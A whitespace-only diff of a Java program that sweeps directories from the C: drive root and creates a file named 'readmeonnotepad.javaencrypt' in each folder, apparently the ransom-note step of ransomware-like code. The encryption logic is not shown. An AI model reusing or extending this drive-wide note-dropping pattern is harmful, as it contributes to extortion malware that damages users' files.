@@ -123,11 +123,6 @@
                }
              
              } catch (IOException iOException) {}
- 
- 
- 
- 
- 
              
              list.add(f);
              folderNum++;
@@ -148,9 +143,6 @@
      } 
    }
  
- 
- 
-   
    public static void find2(String path) {
      File file = new File(path);
      File[] fs = file.listFiles();
@@ -170,8 +162,7 @@
        else {
          
          File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
- 
-         
+        
          try {
            fj.createNewFile();
            if (fj.canWrite()) {
@@ -186,11 +177,7 @@
        } 
      } 
    }
- 
- 
- 
- 
-   
+  
    public static void ret(File f) {
      File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
  
@@ -207,10 +194,7 @@
        } 
      } catch (IOException iOException) {}
    }
- 
- 
- 
-   
+  
    public static void main(String[] args) throws IOException, Exception {
      Scanner sc = new Scanner(System.in);
      ret(new File("C:\\"));
